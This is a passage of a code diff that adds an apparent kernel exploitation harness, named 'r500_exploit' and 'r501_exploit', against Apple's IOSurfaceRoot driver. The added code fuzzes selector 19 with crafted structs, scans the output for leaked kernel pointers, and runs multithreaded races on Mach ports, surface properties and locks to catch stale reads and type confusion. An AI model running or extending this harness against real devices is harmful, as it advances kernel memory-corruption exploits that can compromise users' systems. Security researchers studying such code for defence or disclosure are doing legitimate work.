+                NULL, NULL, NULL, NULL);
+            if (kr == KERN_SUCCESS) rlog(" %d=OK", sizes[si]);
+            else if (kr != (kern_return_t)0xe00002c2) rlog(" %d=0x%x", sizes[si], kr);
+        }
+        rlog("\n");
+
+        mach_port_t wake = MACH_PORT_NULL;
+        mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &wake);
+        mach_port_insert_right(mach_task_self(), wake, wake, MACH_MSG_TYPE_MAKE_SEND);
+        uint64_t aref[1] = { 0 };
+        kr = IOConnectCallAsyncMethod(conn, sel, wake, aref, 1,
+            si3, 3, NULL, 0, NULL, NULL, NULL, NULL);
+        rlog("    ASYNC(3sc): kr=0x%x\n", kr);
+        kr = IOConnectCallAsyncMethod(conn, sel, wake, aref, 1,
+            NULL, 0, st_in, 24, NULL, NULL, NULL, NULL);
+        rlog("    ASYNC(st24): kr=0x%x\n", kr);
+        mach_port_deallocate(mach_task_self(), wake);
+    }
+
+    rlog("\n");
+    fflush(stdout);
+
+    /* Phase 3: Sel 19 specific - varied struct contents */
+    rlog("--- Phase 3: Selector 19 deep analysis ---\n");
+    fflush(stdout);
+
+    struct { const char *name; uint64_t v[3]; } s19_tests[] = {
+        { "{id,0,0}",    { probe_id, 0, 0 } },
+        { "{0,id,0}",    { 0, probe_id, 0 } },
+        { "{0,0,id}",    { 0, 0, probe_id } },
+        { "{id,id,0}",   { probe_id, probe_id, 0 } },
+        { "{id,id,id}",  { probe_id, probe_id, probe_id } },
+        { "{0,0,0}",     { 0, 0, 0 } },
+        { "{FF..}",      { 0xFFFFFFFFFFFFFFFFULL, 0xFFFFFFFFFFFFFFFFULL, 0xFFFFFFFFFFFFFFFFULL } },
+        { "{1,0,0}",     { 1, 0, 0 } },
+        { "{id,1,0}",    { probe_id, 1, 0 } },
+        { "{id,0,1}",    { probe_id, 0, 1 } },
+        { "{id,99,0}",   { probe_id, 99, 0 } },
+        { "{0xDEAD,0,0}",{ 0xDEADBEEF, 0, 0 } },
+    };
+    int n_s19 = sizeof(s19_tests) / sizeof(s19_tests[0]);
+
+    for (int i = 0; i < n_s19; i++) {
+        uint8_t out[128] = {0};
+        size_t out_sz = 128;
+        uint64_t osc[4] = {0};
+        uint32_t osc_cnt = 4;
+
+        kr = IOConnectCallMethod(conn, 19, NULL, 0, s19_tests[i].v, 24,
+            osc, &osc_cnt, out, &out_sz);
+        rlog("  sel19 %-14s: kr=0x%x osc_cnt=%u out_sz=%zu\n",
+            s19_tests[i].name, kr, osc_cnt, out_sz);
+
+        if (kr == KERN_SUCCESS) {
+            for (uint32_t j = 0; j < osc_cnt && j < 4; j++) {
+                if (osc[j] != 0)
+                    rlog("    osc[%u] = 0x%016llx%s\n", j, osc[j],
+                        (osc[j] & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL ? " *** KPTR ***" : "");
+            }
+            if (out_sz > 0) {
+                uint64_t *q = (uint64_t *)out;
+                for (size_t j = 0; j < out_sz / 8 && j < 16; j++) {
+                    if (q[j] != 0)
+                        rlog("    out[%zu] = 0x%016llx%s\n", j * 8, q[j],
+                            (q[j] & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL ? " *** KPTR ***" : "");
                 }
             }
         }
     }
 
-r500_done:
-    rlog("\n=== r500 complete ===\n");
+    /* Race sel 19 from two threads */
+    rlog("\n  Sel19 race test (2000 rounds):\n");
+    fflush(stdout);
+    io_connect_t conn2 = 0;
+    io_service_t svc2 = IOServiceGetMatchingService(kIOMasterPortDefault,
+        IOServiceMatching("IOSurfaceRoot"));
+    IOServiceOpen(svc2, mach_task_self(), 0, &conn2);
+    IOObjectRelease(svc2);
+
+    int s19_both_ok = 0, s19_either_fail = 0;
+    for (int round = 0; round < 2000; round++) {
+        IOSurfaceRef s = IOSurfaceCreate(props);
+        if (!s) continue;
+        uint32_t sid = IOSurfaceGetID(s);
+
+        volatile int go = 0;
+        struct r500_sel19_race_ctx ctx1 = { .conn = conn, .surface_id = sid, .go = &go, .done = 0 };
+        struct r500_sel19_race_ctx ctx2 = { .conn = conn2, .surface_id = sid, .go = &go, .done = 0 };
+
+        pthread_t t1, t2;
+        pthread_create(&t1, NULL, r500_sel19_thread, &ctx1);
+        pthread_create(&t2, NULL, r500_sel19_thread, &ctx2);
+        usleep(5);
+        __sync_synchronize();
+        go = 1;
+        pthread_join(t1, NULL);
+        pthread_join(t2, NULL);
+
+        if (ctx1.kr == KERN_SUCCESS && ctx2.kr == KERN_SUCCESS)
+            s19_both_ok++;
+        else
+            s19_either_fail++;
+
+        CFTypeRef all = IOSurfaceCopyAllValues(s);
+        if (all) {
+            if (CFGetTypeID(all) == CFDictionaryGetTypeID()) {
+                CFIndex cnt = CFDictionaryGetCount((CFDictionaryRef)all);
+                if (cnt > 0 && round < 10)
+                    rlog("    [%d] surface has %ld props after race\n", round, cnt);
+            }
+            CFRelease(all);
+        }
+        CFRelease(s);
+    }
+    rlog("  Sel19 race: both_ok=%d either_fail=%d\n\n", s19_both_ok, s19_either_fail);
+    fflush(stdout);
+
+    /* Phase 4: Framework-level race conditions */
+    rlog("--- Phase 4: Framework-level races ---\n");
+    fflush(stdout);
+
+    /* 4a: MachPort create/lookup/dealloc race */
+    rlog("  4a: MachPort create/lookup/dealloc race (3000 rounds)\n");
+    int mp_valid = 0, mp_null = 0, mp_wrong_id = 0;
+
+    for (int round = 0; round < 3000; round++) {
+        IOSurfaceRef s = IOSurfaceCreate(props);
+        if (!s) continue;
+        uint32_t sid = IOSurfaceGetID(s);
+
+        mach_port_t p = IOSurfaceCreateMachPort(s);
+        if (p == MACH_PORT_NULL) { CFRelease(s); continue; }
+
+        CFRelease(s);
+
+        IOSurfaceRef looked_up = IOSurfaceLookupFromMachPort(p);
+        mach_port_deallocate(mach_task_self(), p);
+
+        if (looked_up) {
+            uint32_t rid = IOSurfaceGetID(looked_up);
+            if (rid == sid)
+                mp_valid++;
+            else {
+                mp_wrong_id++;
+                if (mp_wrong_id <= 5)
+                    rlog("    [%d] WRONG ID: got=%u expected=%u\n", round, rid, sid);
+            }
+            CFRelease(looked_up);
+        } else {
+            mp_null++;
+        }
+    }
+    rlog("  MachPort race: valid=%d null=%d wrong_id=%d\n",
+        mp_valid, mp_null, mp_wrong_id);
+    if (mp_wrong_id > 0)
+        rlog("  *** MACH PORT RACE HIT: got wrong surface ID ***\n");
+    rlog("\n");
+    fflush(stdout);
+
+    /* 4b: SetValue/RemoveValue/CopyValue race */
+    rlog("  4b: Property Set/Remove/Copy race (10000 rounds per surface)\n");
+    IOSurfaceRef race_surf = IOSurfaceCreate(props);
+    if (race_surf) {
+        CFStringRef rkey = CFSTR("_racekey");
+        int iters = 10000;
+
+        volatile int go_prop = 0;
+        struct r500_prop_race_ctx set_ctx = {
+            .surf = race_surf, .key = rkey, .go = &go_prop,
+            .done = 0, .iterations = iters,
+            .null_reads = 0, .mismatches = 0, .type_changes = 0
+        };
+        struct r500_prop_race_ctx rem_ctx = {
+            .surf = race_surf, .key = rkey, .go = &go_prop,
+            .done = 0, .iterations = iters,
+            .null_reads = 0, .mismatches = 0, .type_changes = 0
+        };
+
+        pthread_t t_set, t_rem;
+        pthread_create(&t_set, NULL, r500_set_thread, &set_ctx);
+        pthread_create(&t_rem, NULL, r500_remove_read_thread, &rem_ctx);
+        usleep(10);
+        __sync_synchronize();
+        go_prop = 1;
+        pthread_join(t_set, NULL);
+        pthread_join(t_rem, NULL);
+
+        rlog("  Property race (%d iters): null_reads=%d mismatches=%d type_changes=%d\n",
+            iters, rem_ctx.null_reads, rem_ctx.mismatches, rem_ctx.type_changes);
+        if (rem_ctx.mismatches > 0)
+            rlog("  *** PROPERTY RACE: stale/corrupt reads detected ***\n");
+        if (rem_ctx.type_changes > 0)
+            rlog("  *** TYPE CONFUSION: CFType changed during race ***\n");
+
+        IOSurfaceRemoveValue(race_surf, rkey);
+        CFRelease(race_surf);
+    }
+    rlog("\n");
+    fflush(stdout);
+
+    /* 4c: Lock/Unlock race */
+    rlog("  4c: Lock/Unlock race\n");
+    IOSurfaceRef lock_surf = IOSurfaceCreate(props);
+    if (lock_surf) {
+        IOSurfaceLock(lock_surf, 0, NULL);
+        void *base = IOSurfaceGetBaseAddress(lock_surf);
+        size_t alloc_sz = IOSurfaceGetAllocSize(lock_surf);
+        rlog("    base=%p alloc=%zu\n", base, alloc_sz);
+
+        memset(base, 0xCC, alloc_sz);
+
+        int lock_mismatches = 0;
+        volatile int go_lock = 0;
+        volatile int ul_done = 0;
+
+        dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INTERACTIVE, 0), ^{
+            while (!go_lock) __asm__ volatile("yield");
+            for (int i = 0; i < 5000; i++) {
+                IOSurfaceUnlock(lock_surf, 0, NULL);
+                IOSurfaceLock(lock_surf, 0, NULL);
+            }
+            ul_done = 1;
+        });
+
+        usleep(5);
+        go_lock = 1;
+
+        for (int i = 0; i < 5000; i++) {
+            void *cur_base = IOSurfaceGetBaseAddress(lock_surf);
+            if (cur_base != base) {
+                lock_mismatches++;
+                if (lock_mismatches <= 3)
+                    rlog("    [%d] BASE CHANGED: %p -> %p\n", i, base, cur_base);
+            }
+            if (((uint8_t *)base)[0] != 0xCC && lock_mismatches <= 3) {
+                rlog("    [%d] DATA CHANGED: byte0=0x%02x\n", i, ((uint8_t *)base)[0]);
+            }
+        }
+
+        while (!ul_done) usleep(100);
+
+        rlog("    Lock race: base_changes=%d\n", lock_mismatches);
+        IOSurfaceUnlock(lock_surf, 0, NULL);
+        CFRelease(lock_surf);
+    }
+    rlog("\n");
+    fflush(stdout);
+
+    /* Cleanup */
+    if (conn2) IOServiceClose(conn2);
+    if (conn) IOServiceClose(conn);
+    if (probe_surf) CFRelease(probe_surf);
+    CFRelease(props); CFRelease(wn); CFRelease(hn);
+    CFRelease(bn); CFRelease(brn); CFRelease(pfn);
+
+    rlog("=== r500 Summary ===\n");
+    rlog("Accessible selectors: %d\n", n_accessible);
+    rlog("Sel19 race: both_ok=%d fail=%d\n", s19_both_ok, s19_either_fail);
+    rlog("MachPort race: wrong_id=%d\n", mp_wrong_id);
+    rlog("=== r500 complete ===\n\n");
     fflush(stdout);
 }
+
 
 /* ====================================================================
  * r501: Multi-vector attack surface probe
@@ -99520,19 +99606,13 @@ new_modes:
             goto done;
         }
         if (rounds == 505) {
-            rlog("*** rounds=505: sel19 spray+readback, 97B repro, conn types ***\n\n");
-            fflush(stdout);
-            r501_exploit();
-            goto done;
-        }
-        if (rounds == 505) {
             rlog("*** rounds=505: Multi-vector attack surface probe ***\n\n");
             fflush(stdout);
             r501_exploit();
             goto done;
         }
         if (rounds == 504) {
-            rlog("*** rounds=504: sel19 deep probe + MaxQP=0 extra-byte analysis ***\n\n");
+            rlog("*** rounds=504: Comprehensive IOSurface selector probe + sel19 deep analysis ***\n\n");
             fflush(stdout);
             r500_exploit();
             goto done;
